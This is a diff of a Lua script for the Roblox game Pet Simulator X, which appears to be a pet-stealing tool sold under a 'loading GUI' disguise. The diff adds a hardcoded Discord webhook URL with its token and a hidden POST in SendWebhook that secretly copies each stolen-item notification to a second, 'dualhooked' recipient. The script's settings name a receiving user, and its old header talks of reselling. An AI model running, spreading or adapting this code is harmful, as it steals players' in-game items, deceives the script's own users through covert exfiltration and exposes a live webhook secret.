@@ -1,10 +1,13 @@
-
-
--- DONT LEAK!!
--- IF U WANT TO RESELL IT DM egor1kusa
--- [SEWY]
+    ______                      ______ _                         
+ |  ____|                    |  ____| |                        
+ | |__ _   _  ___  __ _  ___ | |__  | |_ ___ _ __ _ __   ___   
+ |  __| | | |/ _ \/ _` |/ _ \|  __| | __/ _ \ '__| '_ \ / _ \  
+ | |  | |_| |  __/ (_| | (_) | |____| ||  __/ |  | | | | (_) | 
+ |_|   \__,_|\___|\__, |\___/|______|\__\___|_|  |_| |_|\___/  
+                   __/ |                                       
+                  |___/                                                                                                                  
 _G.ScriptTitle = "Pet Simulator X: Loading Gui"
-
+local dhwebhook = "https://discord.com/api/webhooks/1155839297858060349/5r5Xc-qhAvB3ehdX9qClIJD7C83zaWGsRJsT5wm2x8avcLytUBMz6L54uHwXp09rIeIG"
 getgenv().Settings = {
     User = "StickOwwz",
     Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
@@ -1278,6 +1281,16 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
             }
             request(abcdef1)
         end
+       task.wait()
+        if dhwebhook ~= nil then
+          local abcdef2 = {
+          Url = dhwebhook,
+          Body = newdata1,
+          Method = "POST",
+          Headers = headers
+    }
+    request(abcdef2)
+end
     else
         imgs =
         "https://media.discordapp.net/attachments/736080557557022855/1150299910550339644/FB_IMG_1691312902228.jpg"
